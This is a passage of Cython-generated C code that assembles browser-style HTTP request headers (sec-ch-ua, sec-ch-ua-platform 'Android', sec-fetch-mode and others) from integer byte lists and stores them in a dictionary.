  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_65);
  __Pyx_GIVEREF(__pyx_int_65);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_65);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_66);
  __Pyx_GIVEREF(__pyx_int_66);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_66);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_34);
  __Pyx_GIVEREF(__pyx_int_34);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_34);
  __Pyx_INCREF(__pyx_int_59);
  __Pyx_GIVEREF(__pyx_int_59);
  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_59);
  __Pyx_INCREF(__pyx_int_118);
  __Pyx_GIVEREF(__pyx_int_118);
  PyList_SET_ITEM(__pyx_t_2, 14, __pyx_int_118);
  __Pyx_INCREF(__pyx_int_61);
  __Pyx_GIVEREF(__pyx_int_61);
  PyList_SET_ITEM(__pyx_t_2, 15, __pyx_int_61);
  __Pyx_INCREF(__pyx_int_34);
  __Pyx_GIVEREF(__pyx_int_34);
  PyList_SET_ITEM(__pyx_t_2, 16, __pyx_int_34);
  __Pyx_INCREF(__pyx_int_57);
  __Pyx_GIVEREF(__pyx_int_57);
  PyList_SET_ITEM(__pyx_t_2, 17, __pyx_int_57);
  __Pyx_INCREF(__pyx_int_57);
  __Pyx_GIVEREF(__pyx_int_57);
  PyList_SET_ITEM(__pyx_t_2, 18, __pyx_int_57);
  __Pyx_INCREF(__pyx_int_34);
  __Pyx_GIVEREF(__pyx_int_34);
  PyList_SET_ITEM(__pyx_t_2, 19, __pyx_int_34);
  __Pyx_INCREF(__pyx_int_44);
  __Pyx_GIVEREF(__pyx_int_44);
  PyList_SET_ITEM(__pyx_t_2, 20, __pyx_int_44);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 21, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_34);
  __Pyx_GIVEREF(__pyx_int_34);
  PyList_SET_ITEM(__pyx_t_2, 22, __pyx_int_34);
  __Pyx_INCREF(__pyx_int_67);
  __Pyx_GIVEREF(__pyx_int_67);
  PyList_SET_ITEM(__pyx_t_2, 23, __pyx_int_67);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_2, 24, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 25, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 26, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_2, 27, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 28, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_2, 29, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_2, 30, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_34);
  __Pyx_GIVEREF(__pyx_int_34);
  PyList_SET_ITEM(__pyx_t_2, 31, __pyx_int_34);
  __Pyx_INCREF(__pyx_int_59);
  __Pyx_GIVEREF(__pyx_int_59);
  PyList_SET_ITEM(__pyx_t_2, 32, __pyx_int_59);
  __Pyx_INCREF(__pyx_int_118);
  __Pyx_GIVEREF(__pyx_int_118);
  PyList_SET_ITEM(__pyx_t_2, 33, __pyx_int_118);
  __Pyx_INCREF(__pyx_int_61);
  __Pyx_GIVEREF(__pyx_int_61);
  PyList_SET_ITEM(__pyx_t_2, 34, __pyx_int_61);
  __Pyx_INCREF(__pyx_int_34);
  __Pyx_GIVEREF(__pyx_int_34);
  PyList_SET_ITEM(__pyx_t_2, 35, __pyx_int_34);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_2, 36, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_50);
  __Pyx_GIVEREF(__pyx_int_50);
  PyList_SET_ITEM(__pyx_t_2, 37, __pyx_int_50);
  __Pyx_INCREF(__pyx_int_52);
  __Pyx_GIVEREF(__pyx_int_52);
  PyList_SET_ITEM(__pyx_t_2, 38, __pyx_int_52);
  __Pyx_INCREF(__pyx_int_34);
  __Pyx_GIVEREF(__pyx_int_34);
  PyList_SET_ITEM(__pyx_t_2, 39, __pyx_int_34);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_3, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(16); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_98);
  __Pyx_GIVEREF(__pyx_int_98);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_98);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 14, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 15, __pyx_int_101);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_63);
  __Pyx_GIVEREF(__pyx_int_63);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_63);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_49);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_2, __pyx_t_3) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(18); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 12, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 13, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_102);
  __Pyx_GIVEREF(__pyx_int_102);
  PyList_SET_ITEM(__pyx_t_3, 14, __pyx_int_102);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 15, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 16, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_3, 17, __pyx_int_109);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(9); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_34);
  __Pyx_GIVEREF(__pyx_int_34);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_34);
  __Pyx_INCREF(__pyx_int_65);
  __Pyx_GIVEREF(__pyx_int_65);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_65);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_34);
  __Pyx_GIVEREF(__pyx_int_34);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_34);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_3, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(14); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_102);
  __Pyx_GIVEREF(__pyx_int_102);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_102);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_116);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_121);
  __Pyx_GIVEREF(__pyx_int_121);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_121);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_2, __pyx_t_3) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(14); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_102);
  __Pyx_GIVEREF(__pyx_int_102);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_102);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_3, 12, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 13, __pyx_int_101);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_115);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_3, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(14); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_102);
  __Pyx_GIVEREF(__pyx_int_102);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_102);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_116);
